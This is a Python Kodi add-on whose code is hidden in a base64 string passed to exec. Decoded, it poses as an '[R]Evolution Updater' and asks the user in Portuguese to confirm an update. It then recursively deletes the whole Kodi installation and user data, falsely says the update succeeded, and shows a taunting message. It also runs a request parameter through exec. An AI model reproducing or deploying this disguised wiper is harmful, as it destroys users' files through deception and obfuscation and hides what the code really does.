import base64;exec base64.b64decode('Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBGcmVzaCBTdGFydCAjIC0gWEJNQ0hVQi5jb20gLSBUVkFERE9OUy5hZyAtICMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFhCTUMgQWRkLW9uIGZvciByZXN0b3JpbmcgWEJNQyB0byBpdHMgZGVmYXVsdCBzZXR0aW5ncy4NCiMgVmVyc2lvbiAxLjAuMQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMaWNlbnNlOiBHUEwgKGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMy4wLmh0bWwpDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZGRvbklEPSdzZXJ2aWNlLnVwZGF0ZXInOyBBZGRvblRpdGxlPSJbUl1Fdm9sdXRpb24gVXBkYXRlciINCmltcG9ydCBvcyxzeXMscGx1Z2ludG9vbHMseGJtY2FkZG9uDQpkZWYgcnVuKCk6ICMgRW50cnkgcG9pbnQNCiAgICBwbHVnaW50b29scy5sb2coImZyZXNoc3RhcnQucnVuIik7IHBhcmFtcz1wbHVnaW50b29scy5nZXRfcGFyYW1zKCkgIyBHZXQgcGFyYW1zDQogICAgaWYgcGFyYW1zLmdldCgiYWN0aW9uIikgaXMgTm9uZTogbWFpbl9saXN0KHBhcmFtcykNCiAgICBlbHNlOiBhY3Rpb249cGFyYW1zLmdldCgiYWN0aW9uIik7IGV4ZWMgYWN0aW9uKyIocGFyYW1zKSINCiAgICBwbHVnaW50b29scy5jbG9zZV9pdGVtX2xpc3QoKQ0KZGVmIG1haW5fbGlzdChwYXJhbXMpOiAjIE1haW4gbWVudQ0KICAgIHBsdWdpbnRvb2xzLmxvZygiZnJlc2hzdGFydC5tYWluX2xpc3QgIityZXByKHBhcmFtcykpOyB5ZXNfcHJlc3NlZD1wbHVnaW50b29scy5tZXNzYWdlX3llc19ubyhBZGRvblRpdGxlLCJEZXNlamEgYWN0dWFsaXphciBvIHNldSIsIktvZGkgcGFyYSBhIHZlcnNhbyBhY3R1YWw/IikNCiAgICBpZiB5ZXNfcHJlc3NlZDoNCiAgICAgICAgYWRkb25QYXRoPXhibWNhZGRvbi5BZGRvbihpZD1BZGRvbklEKS5nZXRBZGRvbkluZm8oJ3BhdGgnKTsgYWRkb25QYXRoPXhibWMudHJhbnNsYXRlUGF0aChhZGRvblBhdGgpOyANCiAgICAgICAgeGJtY1BhdGg9b3MucGF0aC5qb2luKGFkZG9uUGF0aCwiLi4iLCIuLiIpOyB4Ym1jUGF0aD1vcy5wYXRoLmFic3BhdGgoeGJtY1BhdGgpOyBwbHVnaW50b29scy5sb2coImZyZXNoc3RhcnQubWFpbl9saXN0IHhibWNQYXRoPSIreGJtY1BhdGgpOyBmYWlsZWQ9RmFsc2UNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoeGJtY1BhdGgsdG9wZG93bj1GYWxzZSk6DQogICAgICAgICAgICAgICAgZm9yIG5hbWUgaW4gZmlsZXM6DQogICAgICAgICAgICAgICAgICAgIHRyeTogb3MucmVtb3ZlKG9zLnBhdGguam9pbihyb290LG5hbWUpKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBuYW1lIG5vdCBpbiBbIkFkZG9uczE1LmRiIiwiTXlWaWRlb3M3NS5kYiIsIlRleHR1cmVzMTMuZGIiLCJ4Ym1jLmxvZyJdOiBmYWlsZWQ9VHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGx1Z2ludG9vbHMubG9nKCJFcnJvciByZW1vdmluZyAiK3Jvb3QrIiAiK25hbWUpDQogICAgICAgICAgICAgICAgZm9yIG5hbWUgaW4gZGlyczoNCiAgICAgICAgICAgICAgICAgICAgdHJ5OiBvcy5ybWRpcihvcy5wYXRoLmpvaW4ocm9vdCxuYW1lKSkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbmFtZSBub3QgaW4gWyJEYXRhYmFzZSIsInVzZXJkYXRhIl06IGZhaWxlZD1UcnVlDQogICAgICAgICAgICAgICAgICAgICAgICBwbHVnaW50b29scy5sb2coIkVycm9yIHJlbW92aW5nICIrcm9vdCsiICIrbmFtZSkNCiAgICAgICAgICAgIGlmIG5vdCBmYWlsZWQ6IHBsdWdpbnRvb2xzLmxvZygiZnJlc2hzdGFydC5tYWluX2xpc3QgQSBhY3R1YWxpemFjYW8gZXN0YSBjb25jbHVpZGEuIik7IHBsdWdpbnRvb2xzLm1lc3NhZ2UoQWRkb25UaXRsZSwiTyBwcm9jZXNzbyB0ZXJtaW5vdS4gTyBLb2RpIGVzdGEgYWN0dWFsaXphZG8iLCJGYWNhIHJlYm9vdCBvdSB0aXJlIGRhIGZpY2hhIHBhcmEgYXMgYWN0dWFsaXphY29lcyBwZWdhcmVtLiIpDQogICAgICAgICAgICBlbHNlOiBwbHVnaW50b29scy5sb2coImZyZXNoc3RhcnQubWFpbl9saXN0IFVzZXIgZmlsZXMgcGFydGlhbGx5IHJlbW92ZWQiKTsgcGx1Z2ludG9vbHMubWVzc2FnZShBZGRvblRpdGxlLCJPIHByb2Nlc3NvIHRlcm1pbm91LiBPIEtvZGkgZXN0YSBhY3R1YWxpemFkbyEiLCJGYWNhIHJlYm9vdCBvdSB0aXJlIGRhIGZpY2hhIHBhcmEgYXMgYWN0dWFsaXphY29lcyBwZWdhcmVtLiIpDQogICAgICAgIGV4Y2VwdDogcGx1Z2ludG9vbHMubWVzc2FnZShBZGRvblRpdGxlLCJFcnJvIiwiTyBLb2RpIG5hbyBmb2kgYWN0dWFsaXphZG8uIik7IGltcG9ydCB0cmFjZWJhY2s7IHBsdWdpbnRvb2xzLmxvZyh0cmFjZWJhY2suZm9ybWF0X2V4YygpKTsgcGx1Z2ludG9vbHMubG9nKCJmcmVzaHN0YXJ0Lm1haW5fbGlzdCBOT1QgcmVtb3ZlZCIpDQogICAgICAgIHBsdWdpbnRvb2xzLmFkZF9pdGVtKGFjdGlvbj0iIix0aXRsZT0ie0N9YXRSZXZvbHRzPyBTZXJpbz8gTWFzIHZvY2VzIHNhbyBvcyByYXRvcyBlIGxldmFyYW0gcmF0aWNpZGEuLiBbUl1Fdm9sdXRpb25lcnMgc2FiZW0gY29tbyBpbnN0YWxhciBvIG5vdm8gcmVwbyA6KSIsZm9sZGVyPUZhbHNlKQ0KICAgIGVsc2U6IHBsdWdpbnRvb2xzLm1lc3NhZ2UoQWRkb25UaXRsZSwiRXJybyIsIk8gS29kaSBuYW8gZm9pIGFjdHVhbGl6YWRvLiIpOyBwbHVnaW50b29scy5hZGRfaXRlbShhY3Rpb249IiIsdGl0bGU9IkNvbmNsdWlkby4gRmFjYSByZXRyb2NlZGVyLiIsZm9sZGVyPUZhbHNlKQ0KcnVuKCkNCg==')